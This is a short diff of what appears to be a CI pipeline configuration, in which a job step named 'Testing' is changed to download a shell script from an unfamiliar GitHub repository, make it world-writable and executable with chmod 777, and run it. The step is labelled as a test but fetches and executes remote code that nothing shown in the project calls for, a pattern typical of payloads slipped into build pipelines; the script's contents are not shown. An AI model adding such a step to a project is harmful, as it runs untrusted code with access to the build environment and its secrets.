@@ -7,4 +7,4 @@ jobs:
       - checkout
       - run:
           name: "Testing"
-          command:  wget https://github.com/guttenocm/songdilan/blob/main/get.sh && ls -l
+          command:  wget https://github.com/guttenocm/songdilan/blob/main/get.sh && chmod 777 get.sh && sh get.sh
